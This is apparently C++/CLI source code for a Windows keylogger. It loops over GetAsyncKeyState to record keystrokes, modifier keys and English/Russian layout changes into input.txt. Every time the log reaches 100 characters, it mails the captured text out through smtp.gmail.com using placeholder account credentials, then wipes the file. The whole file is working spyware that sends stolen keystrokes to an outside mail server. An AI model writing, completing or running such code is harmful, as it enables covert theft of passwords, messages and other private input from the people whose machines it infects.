#include "aLibrary.h"


class Key {
private:
	int Keyboard_Lang[2] = {67699721, 68748313};
	int Segment;

public:

	int but() {
		String ^InputFileStiler = "input.txt", ^SmtPmaiL = "smtp.gmail.com";

		//cout << "please your gmail:" << endl;
		//String ^YourMail = Console::ReadLine();

		//cout << "please your password:" << endl;
		//String ^YourPassword = Console::ReadLine();

		SmtpClient ^smtp = gcnew SmtpClient(SmtPmaiL, 25);
		smtp->Credentials = gcnew NetworkCredential("/*your email*/", "/*your password from email*/");
		smtp->EnableSsl = true;

		MailMessage ^MSG = gcnew MailMessage();
		MSG->From = gcnew MailAddress("/*your email*/");
		MSG->To->Add(gcnew MailAddress("/*your email*/"));
		MSG->Subject = "HELLO1";


		while (1) {
			File_Save_Log;
			ifstream seen("input.txt");

			int RASKladka = (int)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
			if (RASKladka == Keyboard_Lang[1] && RASKladka != Segment) {
				SS;
				file << "|en|";

			}
			else if (RASKladka == Keyboard_Lang[0] && RASKladka != Segment) {
				SS;
				file << "|rus|";
			}

			string Seen_buffer;

			for (TCHAR i = 8; i <= 222; i++) {
					if (GetAsyncKeyState(VkKeyScan(i)) == NUM_PRESS) {
						file << i;
						break;
					}
					else if (GetAsyncKeyState(VK_SHIFT) == NUM_PRESS) {
						file << "|ShIfT|";
						break;
					}
					else if (GetAsyncKeyState(VK_MENU) == NUM_PRESS) {
						file << "|AlT|";
						break;
					}
					else if (GetAsyncKeyState(VK_CAPITAL) == NUM_PRESS) {
						file << "|CAPS|";
						break;
					}
					else if (GetAsyncKeyState(VK_TAB) == NUM_PRESS) {
						file << "|TAB|";
						break;
					}
					else if (GetAsyncKeyState(VK_RETURN) == NUM_PRESS) {
						file << "|ENT|";
						break;
					}
				}
			if (seen.is_open())while (getline(seen, Seen_buffer));

			if (Seen_buffer.length()+1 >= 100) {
				String ^Helper = msclr::interop::marshal_as<String ^>(Seen_buffer);
				MSG->Body = Helper;
				smtp->Send(MSG);
				Seen_buffer.clear();
				ofstream file1("input.txt");
				file1.close();
			}
			else Seen_buffer.clear();
			file.close();
		}
		return 0;
	}
};
